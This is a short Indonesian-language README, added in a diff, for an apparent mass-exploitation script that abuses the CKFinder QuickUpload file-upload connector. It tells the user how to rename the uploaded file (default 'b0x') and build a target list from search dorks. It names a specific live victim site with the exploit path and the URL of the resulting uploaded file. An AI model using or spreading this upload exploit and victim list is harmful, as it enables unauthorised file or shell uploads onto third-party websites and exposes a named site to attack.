@@ -1,0 +1,15 @@
+Buka ex.py, rubah nama file disarankan tanpa ekstensi aja sih
+defaultnya itu yg b0x, listnya harus begini
+
+dork:
+banyak di internet
+
+Exploit: /ckfinder/core/connector/php/connector.php?command=QuickUpload&type=Images
+
+LIVE TARGET (yang masuk di list url + exploitnya) karna pathnya bisa beda2 jadi masih manual ya :u
+https://www.ripay.es/ckfinder/core/connector/php/connector.php?command=QuickUpload&type=Images
+
+results
+https://www.ripay.es/galeria/images/b0x
+
+by laggerghost, icp.
